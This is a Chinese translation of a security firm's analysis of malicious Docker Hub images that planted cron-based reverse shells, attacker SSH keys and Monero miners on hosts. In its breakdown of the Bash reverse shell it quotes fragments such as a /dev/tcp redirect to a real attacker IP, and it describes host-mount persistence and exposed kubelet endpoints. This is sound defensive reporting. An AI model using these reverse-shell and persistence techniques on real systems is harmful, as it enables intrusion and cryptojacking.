# Cryptojacking侵入云端：如何看待Docker镜像进入Docker Hub

阅读量 **147648**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-26 15:40:32

 **x**

##### 译文声明

本文是翻译文章，文章来源：kromtech.com

原文地址：<https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t013a441fff142aa247.jpg)

Kromtech安全中心发现了17个存储在Docker
Hub整整一年的恶意docker镜像。即使在sysdig.com和fortinet.com通过GitHub和Twitter进行了多次投诉之后，网络犯罪分子仍在Docker
Hub上继续扩大他们的恶意软件武器库。由于拥有超过500万的吸引力，docker123321私人镜像库被认为是一个用于加密容器的跳板。如今，像Kubernetes这样的可公开访问、配置不当的编排平台越来越多，这让黑客能够创建一个完全自动化的工具，迫使这些平台挖掘门罗币。通过将恶意镜像推送到Docker
Hub镜像库，并将其从受害者的系统中提取出来，黑客能够挖掘544.74枚门罗币，相当于90000美元。

这是时间表：

图1.恶意docker123321镜像库生命周期的时间表

部署用于教育目的或缺乏安全需求的Kubernetes集群对其所有者构成巨大威胁。即使是一位经验丰富的工程师，在测试之后，也可能不在乎甚至忘记基础设施的那部分。

## 背景

Palo Alto Networks [发布](https://www.paloaltonetworks.com/threat-research?PageSpeed=noscript)：

攻击者通常通过窃取身份或信用卡号码，然后在地下市场上出售，从中获利。根据Verizon数据泄露调查报告，[被盗记录](http://www.verizonenterprise.com/verizon-insights-lab/dbir/)的[价格已经下降](http://www.verizonenterprise.com/verizon-insights-lab/dbir/)，因此网络攻击者正在寻找新的途径来提高他们的利润。得益于攻击分布、匿名支付以及对数据进行可靠加密和解密的能力不断提升，勒索软件正在遭受重创。

随着加密货币潮流的到来及几种加密货币价格的上涨，加密货币挖掘恶意软件事件的数量也在增长。一段时间以来，网络犯罪分子一直在对被劫持的机器进行加密货币攻击，他们发现这种攻击比勒索软件更加有利可图。然而，恶意软件的作者们现在已经找到了一种新的方法，可以将他们的邪恶行为转移到云端，从而避免了劫持个人计算机的需要。寻找配置不当的云本地环境，黑客的目的是利用大型计算能力挖掘加密货币。

## 我们为什么这样做？

我们注意到，黑客对像Kubernetes这样可公开访问的编排平台的兴趣有所增加——这是一个容器编排工具，可自动执行容器的部署、更新和监控。

在2018年初，[Sysdig的研究](https://sysdig.com/blog/detecting-cryptojacking/)表明，攻击者已经从EC2漏洞攻击转向了特定于容器的攻击和特定于kuberne漏洞的攻击。位于蜜罐服务器上的预配置的Kubernetes实例被恶意Docker容器毒害，这些容器将挖掘门罗币。

加密攻击已经成为现实生活中的一个问题，针对的是形形色色的受害者，从个人消费者到大型制造商。在2018年2月，[Checkpoint
的研究人员发现](https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovered/)了有史以来发现的最大的恶意挖矿作业之一。网络犯罪分子在Jenkins
Java反序列化实现中利用了已知的CVE-2017-1000353漏洞。由于Jenkins被称为部署最广泛的自动化服务器，估计有100万用户，这种攻击导致了更严重的后果。在恶意挖矿作业中，黑客累积了10,800枚门罗币，目前价值3,436,776美元。

与此同时，在2018年2月，[RedLock的](https://blog.redlock.io/cryptojacking-tesla)[研究人员发现](https://blog.redlock.io/cryptojacking-tesla)，数百台Kubernetes管理控制台可以在没有任何密码保护的情况下通过互联网访问，其中包括属于Tesla的服务器。黑客渗入了Tesla的Kubernetes控制台，该控制台没有密码保护。在一个Kubernetes
pod中，访问凭证暴露在Tesla的AWS环境中，该环境包含一个Amazon S3（Amazon Simple Storage
Service）存储桶，该存储桶包含一些敏感数据，比如遥测技术。除了数据暴露，黑客还从Tesla的一个Kubernetes pod中进行加密货币挖掘。

Tesla事件只是我们将在未来几个月和几年中看到的众多基于容器技术漏洞利用的第一个。

## 什么是容器、Docker和Kubernetes？

容器是一种打包软件的方式。你可以把它想象成运行一个虚拟机，而不需要占用整个操作系统的开销。

Docker可以帮助你在容器中创建和部署软件。使用Docker，你可以创建一个名为Dockerfile的特殊文件。Dockerfiles定义了一个构建过程，当它被提供给“docker
build”命令时，将生成一个不变的docker镜像。你可以将此视为应用程序的快照，随时准备就绪。当你想启动它时，只需使用“docker
run”命令在支持和运行docker守护进程的任何地方运行它。它可以在你的笔记本电脑上，也可以在你的云服务器上，或在树莓派上。Docker还提供了一个名为Docker
Hub的基于云的存储库。你可以将它想象为Docker镜像的GitHub。你可以使用Docker Hub来存储和分发构建的容器镜像。

当你需要在正确的时间启动正确的容器时，请弄清楚他们如何相互通信、处理存储问题以及处理容器或硬件故障，这就是Kubernetes的切入点。Kubernetes是一个开源的容器编排平台，允许大量的容器协同工作，减少操作负担。它有助于以下事情：

l 在许多不同的机器上运行容器

l 当需求发生变化时，通过添加或删除容器来放大或缩小规模

l 保持存储与应用程序的多个实例一致

l 在容器之间分配负载

l 如果发生故障，在不同的机器上启动新的容器

Kubernetes得到了所有主要容器管理和云平台的支持，如Red Hat OpenShift、Docker EE、Rancher、IBM
Cloud、AWS EKS、Azure、SUSE CaaS和Google Cloud。

## 网络犯罪分子的行为如何

[Aqua Security](https://blog.aquasec.com/cryptocurrency-miners-abusing-containers-anatomy-of-an-attempted-attack)和[Alexander
Urcioli](https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c)分别解释了Docker引擎和Kubernetes实例的原始攻击方案。

在第一个案例中，Aqua Security的研究人员用一个“意外”暴露的docker守护程序模拟了一个系统。这是他们两天后发现的：

l 记录了数百个可疑行为，其中许多是自动创建的。

l 攻击者试图为镜像和容器管理执行各种docker命令。

l 在成功收集关于正在运行的Docker版本的信息后，攻击者使用docker导入功能进行镜像注入。

l 在成功的镜像注入之后，攻击者将开始挖掘。

第二个案例展示了[Alexander Urcioli](https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c)
如何遇到一个已经被妥协的Kubernetes集群。他意识到，由于配置不当，导致了kubelet端口（TCP 10250、TCP
10255）的公开和未经身份验证的API请求，攻击者：

l 发送了两个请求：一个初始POST和一个后续的GET命令给kubelet 。

l 通过kubelet 在正在运行的Docker容器上执行dropper脚本。名为“ kube
.lock”的Dropper脚本将从transfer.sh下载挖掘软件并执行它。

最近，我们发现了另一个令人不安的问题，即配置不当的[kubernetes ](https://kromtech.com/blog/security-center/weightwatchers-exposure-a-simple-yet-powerful-lesson-in-cloud-security)[集群](https://kromtech.com/blog/security-center/weightwatchers-exposure-a-simple-yet-powerful-lesson-in-cloud-security)。事实证明，kubelet
在端口10250上公开了一个未经过身份验证的端点。

让我们再来回顾一下[Alexander Urcioli的](https://medium.com/handy-tech/analysis-of-a-kubernetes-hack-backdooring-through-kubelet-823be5c3d67c)研究：

kubelet监听有两个端口:10255和10250。前者是只读HTTP端口，后者是HTTPS端口，基本上可以做任何你想做的事情。

进一步的检查显示，Kubernetes
PodList泄露了AWS访问密钥（访问密钥ID和秘密访问密钥），这些密钥仅提供对AWS环境的根访问，包括Amazon EC2、RDS、S3和其相关操作。

当我们查看[最新的](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)[kubelet ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)[文档时，](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)我们会发现负责在任何容器中运行代码的调试处理程序。该选项在默认情况下是启用的。

–enable-debugging-handlers Default: true

允许服务器端点进行日志收集和容器和命令的本地运行

在默认情况下，与暴露的10250端口一起保留的选项可能会导致灾难性的后果。

我们现在可以假设，一个普通的网络罪犯可以采取哪些步骤来攻击基于容器的虚拟环境：

l 通过Shodan、Censys 或Zoomeye 自动收集目标。

l 渗透易受攻击或错误不当的Docker镜像库或Kubernetes实例。

l
利用弱默认设置并在容器中注入挖掘恶意软件。通常，这是通过向docker主机注入恶意的docker镜像来实现的。实现这一目的的常用方法是将镜像推送到镜像库（Docker
Hub是自然位置），并将其从受害主机中提取出来。

这一切都需要C2服务器，网络犯罪分子如何构建它：

l 通过Shodan、Censys 或Zoomeye 自动收集目标。

l 利用AutoSopIt等自动化开发远程目标。

l 完全控制被攻击的目标，并在那里放置C2服务器。

## Docker是否关心？

为什么将挖掘恶意软件打包到Docker容器是可行的？我们决定从安全的角度来研究Docker镜像。

在一次[采访中](https://medium.com/s-c-a-l-e/how-containers-became-a-tech-darling-and-why-docker-became-their-poster-child-bfaf9ac87825)，爱立信云计算负责人Jason
Hoffman表示：“由于是新的软件包管理，因此Docker正在崛起。”
这很好地解释了Docker的迅速采用，但也隐藏了Docker镜像通常依赖于底层Linux发行版提供的软件包管理器的事实。像[CentOS
5.11](https://registry.hub.docker.com/_/centos/)这样的镜像是为了兼容性而故意保留的，并且具有Shellshock漏洞。

从<https://medium.com/microscaling-systems/dockerfile-security-tuneup-166f1cdafea1>

容器和虚拟机之间的主要区别之一是容器与主机共享内核。默认情况下，docker容器以root身份运行，这将导致出现断网风险。如果你的容器以root用户身份受到攻击，那么它将对主机进行根访问。

Docker在有限的时间内将安全扫描作为免费预览提供。从Docker [文档](https://docs.docker.com/v17.12/docker-cloud/builds/image-scan/)：

Docker安全扫描

Docker安全扫描预览服务将于2018年3月31日结束，以用于Docker Cloud和Docker
Hub中的私有回购（而非官方回购）。在此之前，私人回购扫描仅限于“latest”标签每天扫描一次。

从[blog.docker.com](https://blog.docker.com/2016/05/docker-security-scanning/)：

Docker安全扫描与Docker
Cloud一起，在将新图像推送到存储库时触发一系列事件。该服务包括扫描触发器、扫描器、数据库、插件框架和连接CVE数据库的验证服务。

安全扫描为你的Docker镜像提供了一个详细的安全性配置文件，用于主动风险管理和简化软件遵从性。Docker安全扫描在部署镜像之前对映像进行二进制级扫描，提供详细的物料清单（BOM），列出所有层和组件，持续监视新漏洞，并在发现新漏洞时提供通知。

从Docker [文档](https://docs.docker.com/docker-cloud/migration/)：

Docker Cloud中的集群和应用程序管理服务将于5月21日关闭。你必须将你的应用程序从Docker Cloud迁移到另一个平台，并删除你的集群。

Docker Cloud的运行时间正在停止。这意味着你将不再能够管理你的节点、集群以及在Docker
Cloud中运行的应用程序。为了保护你的应用程序，你必须将它们迁移到其他平台，如果可以，还必须将集群从Docker Cloud中删除。

看起来Docker的生态系统正变得更加面向企业，安全迁移和进一步安全维护的责任落在了普通的开发人员身上。

## 什么地方出了错？

多条推文提到了嵌入式加密矿工：

图2\.
Twitter用户发现Docker容器中的嵌入式BTC矿工。<https://twitter.com/jperras/status/894561761252319232>该镜像已被禁止

图3.Twitter用户抱怨说，在Docker Hub上没有便捷的方式报告恶意软件

图4.由于没有便捷的方式在Docker Hub上报告恶意镜像，用户在GitHub上投诉。

当我们在GitHub上浏览的时候，我们发现了一个引起我们注意的投诉：

图5\. Docker Hub docker123321镜像库被指控存储恶意镜像

图6.公共存储库<https://hub.docker.com/r/docker123321/>大约在2017年5月创建，涉嫌存储了17个恶意镜像

镜像的名称

|

创建时间戳  
  
---|---  
  
docker123321/tomcat

|

2017-07-25 04:53:28  
  
docker123321/tomcat11

|

2017-08-22 08:38:48  
  
docker123321/tomcat22

|

2017-08-22 08:58:35  
  
docker123321/kk

|

2017-10-13 18:56:22  
  
docker123321/mysql

|

2017-10-24 01:49:42  
  
docker123321/data

|

2017-11-09 01:00:14  
  
docker123321/mysql0

|

2017-12-12 18:32:22  
  
docker123321/cron

|

2018-01-05 11:33:04  
  
docker123321/cronm

|

2018-01-05 11:33:04  
  
docker123321/cronnn

|

2018-01-12 02:06:11  
  
docker123321/t1

|

2018-01-18 09:54:04  
  
docker123321/t2

|

2018-01-19 09:41:46  
  
docker123321/mysql2

|

2018-02-02 11:40:53  
  
docker123321/mysql3

|

2018-02-02 18:52:00  
  
docker123321/mysql4

|

2018-02-05 14:05:18  
  
docker123321/mysql5

|

2018-02-05 14:05:18  
  
docker123321/mysql6

|

2018-02-07 02:16:29  
  
在2017年7月和8月分别创建了三个恶意的docker镜像：

l docker123321/tomcat

l docker123321/tomcat11

l docker123321/tomcat22

我们使用CLI使用“$ docker inspect docker123321/tomcat”检查了docker映像：

图7\. CLI命令的输出

事实证明，该镜像运行一个包含一系列命令的shell脚本：

l 将/ etc /从主机文件系统挂载到/ mnt / etc /内部，以便将它写入主机上/ etc下的文件。

l 在主机上添加新的cronjob到/ etc / crontab。它允许攻击者获得对受害者系统的持久性。

l Cronjob每分钟运行一次，并执行Python反向
Shell，这会为攻击者提供受害者机器上的交互式shell。攻击者在服务器端写入的所有内容都通过套接字发送。然后受害者的系统会像命令一样在子进程中执行它。

想象一下，一个没有经验的用户提取docker123321 /
tomcat这样的镜像。即使用户意识到镜像不是它所代表的内容，并试图将其从系统中删除，用户也很容易被黑客攻击。

此镜像与以前的恶意shell脚本类似，因为它也：

l 向主机上的/ etc / crontab添加一个新条目以执行有效载荷

图8.“$ docker inspect docker123321 / tomcat11”CLI命令的输出

与前面的示例不同的是，这个shell脚本运行的是Bash反向Shell，它执行以下操作：

l 使受害者机器连接到控制服务器，然后将会话转发给它。

l 命令bash -i>＆用“交互式（interactive）”选项调用bash。

l 然后/dev/tcp/98.142.140.13/3333通过设备文件将该会话重定向到TCP套接字。Linux已经构建了一个/ dev /
device文件。

l 这个内置的设备文件允许bash直接连接到任何IP和任何TCP端口

l 最后0>＆1接收标准输出，并将其连接到标准输入。

我们意识到，当容器在受害者的机器上运行时，它将使攻击者控制远程命令执行的机器。

图9.“$ docker inspect docker123321 / tomcat22”CLI命令的输出

在这里，我们找到了一个shell脚本，它的作用如下：

l 将/root/.ssh/从主机文件系统挂载到容器内的/mnt/root/.ssh/，以便将其写入主机上/root/.ssh/下的文件。

l 将SSH密钥添加到主机上的/root/.ssh/authorized_keys文件。它的目的是提供访问，而不需要为每次登录设置密码。

一旦完成，它授予攻击者对受害者机器的完全控制。赚取利润就像在一个受损系统上注入勒索软件或在受损系统上进行挖掘一样简单。

2017年10月：添加了2个新的恶意镜像：

l docker123321/kk

l docker123321/mysql

图10.“$ docker inspect docker123321 / kk”CLI命令的输出

检查显示以下行为：

l 首先，它在主机/ etc目录下添加一个新的crontab条目。

l Cronjob每分钟运行一次，并使系统工具curl下载test44.sh。

图11\. test44.sh

l test44.sh bash脚本文件包含启动5个加密采矿bitnn / alpine- xmrig容器的命令序列，这些容器连接到crypto-pool.fr采矿池。

犯罪分子的门罗币钱包出现在bash脚本中——41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo

图12.犯罪分子的门罗币钱包

支付金额为544.74 XMR，相当于89097.67美元。这里有很高的可能性，这近9万美元是通过使用加密挖掘容器污染云环境赚取来的。

在docker123321/mysql中实现了一个类似的算法：

图13.“$ docker inspect docker123321 / mysql”CLI命令的输出

当容器运行时，将发生以下情况：

l 首先，它在主机/ etc目录下添加新的crontab条目。

l Cronjob每分钟运行一次，并使系统工具curl下载logo3.jpg，这实际上是一个bash脚本。

l 该脚本包含一系列命令，可以在受害者的机器上启动挖掘软件。

fortinet.com早前已经对docker123321/cron的test44.sh和相同的恶意logo1.jpg进行了[详细的研究](https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet.html)。

研究表明，docker123321镜像可以分为五类。

Docker镜像名称

|

恶意软件的类型  
  
---|---  
  
docker123321/tomcat

docker123321/mysql2

docker123321/mysql3

docker123321/mysql4

docker123321/mysql5

docker123321/mysql6

|

容器运行Python反向Shell  
  
docker123321/tomcat11

|

容器运行Bash反向Shell  
  
docker123321/tomcat22

|

容器添加攻击者的SSH密钥  
  
docker123321/cron

docker123321/cronm

docker123321/cronnn

docker123321/mysql

docker123321/mysql0

docker123321/data

docker123321/t1

docker123321/t2

|

容器运行嵌入式加密货币矿工。

（在容器运行的情况下，它将下载恶意的.jpg文件，该文件在bash中运行并公开挖掘软件。）  
  
docker123321/kk

|

容器运行嵌入式加密货币矿工

（在容器运行的情况下，它将下载恶意的.sh文件，该文件在在bash中运行并公开挖掘软件。）  
  
表1\. Python反向Shell和嵌入式加密货币矿工持有大部分镜像

Docker镜像名称

|

镜像中使用的IP地址  
  
---|---  
  
docker123321/cron

docker123321/cronm

|

162.212.157.244  
  
docker123321/mysql

|

104.225.147.196  
  
docker123321/mysql0

|

128.199.86.57  
  
docker123321/mysql2

docker123321/mysql3

docker123321/mysql4

docker123321/mysql5

docker123321/mysql6

|

45.77.24.16  
  
docker123321/data

|

142.4.124.50  
  
docker123321/kk

|

198.181.41.97  
  
docker123321/tomcat

docker123321/tomcat11

|

98.142.140.13  
  
docker123321/cronnn

|

67.231.243.10  
  
docker123321/t1

docker123321/t2

|

185.82.218.206  
  
表2.攻击者使用9个IP来寻址他的远程服务器

一个简单的查找（例如67.231.243.10）显示IP被用于处理恶意软件，包括：

l [xmrig.exe](https://github.com/xmrig/xmrig) –
开源的[加密货币](https://github.com/xmrig/xmrig)挖掘工具

l .jpg文件，被混淆的恶意bash脚本

l PowerShell脚本

图14\. IP地址信息

当我们使用Shodan CLI获得最常用IP的历史视图时，我们看到以下内容：

图15\. Shodan主机信息

图16

图17

它显示了与OpenSSH、Pure-FTPd、ProFTPD和Apache HTTP
Server相关的网络服务中的许多漏洞。攻击者很有可能利用这些漏洞将远程机器变成命令和控制服务器。

## 结论

对普通用户来说，只需从DockerHub中提取一个Docker镜像，就像从任何地方提取任意二进制数据，执行它，并且希望获得最好的结果，而不必知道它里面的内容。

我们应该考虑的主要问题是可追溯性。提取Docker映像的过程必须是透明的，并且易于遵循。首先，你可以简单地尝试查看Dockerfile，以了解FROM和ENTRYPOINT符号以及容器的功能。其次，使用[Docker自动化构建](https://docs.docker.com/docker-hub/github/#automated-builds-from-github)来构建Docker镜像。这是因为，使用Docker自动构建，你可以在Dockerfile的源代码、镜像的版本和实际的构建输出之间获得可追溯性。

每一个构建的细节都显示了大量的信息，用于提高镜像的可信度：

l 使用Dockerfile从git存储库获取的SHA

l 显示执行的Dockerfile中的每条命令

l 最后，这一切都以推送的镜像摘要结束

Kubernetes的部署同和传统环境一样容易遭受来自黑客和内部人员的攻击和利用。通过攻击编排工具，黑客可以破坏正在运行的应用程序，甚至可以控制用于运行容器的底层资源。旧的安全模型和工具将无法跟上不断变化的容器环境。你需要问问自己，你是否能够监控容器或容器内发生的情况，以确定是否存在潜在的漏洞利用。特别注意最具破坏性的“杀死链”攻击——一系列的恶意活动，共同实现攻击者的目标。检测链中的事件需要多层次的安全监控。

Kubernetes集群中的内部和外部通信应被视为安全配置中最重要的部分。我们学到的关键概念是：

l 该连接不够安全，无法在internet.kubelet上运行。

l 必须使用SSH隧道将数据包安全地放到集群的网络上，而不会将kubelet的Web服务器暴露给互联网。

l kubelet需要使用由集群CA签名的证书来服务其https端点。

遵循这些原则可以帮助你获得一定程度的安全意识。

审核人：yiwang 编辑：边边

本文翻译自kromtech.com [原文链接](https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **圆圈** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148747](/post/id/148747)

安全客 - 有思想的安全新媒体

本文转载自: [kromtech.com](https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers)

如若转载,请注明出处： <https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Docker](/tag/Docker)
  * [技术分析](/tag/技术分析)
  * [加密货币](/tag/加密货币)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t01a427938cfa1b52e2.png) 圆圈

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

